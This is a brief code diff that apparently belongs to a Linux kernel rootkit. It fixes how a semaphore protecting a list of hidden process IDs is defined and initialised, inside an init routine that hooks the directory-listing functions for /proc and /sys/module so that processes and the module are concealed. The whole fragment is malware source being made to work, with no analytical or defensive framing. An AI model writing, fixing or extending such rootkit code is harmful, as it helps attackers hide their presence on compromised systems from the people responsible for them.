@@ -3,7 +3,7 @@
 extern u8 module_hidden;
 
 LIST_HEAD(hidden_pid_list);
-extern struct semaphore hidden_pid_list_sem;
+struct semaphore hidden_pid_list_sem;
 
 struct hidden_pid_t
 {
@@ -66,6 +66,7 @@ int hidefs_init(void)
     SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
     SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);
 
+    sema_init(&hidden_pid_list_sem, 1);
     return 0;
 }
 
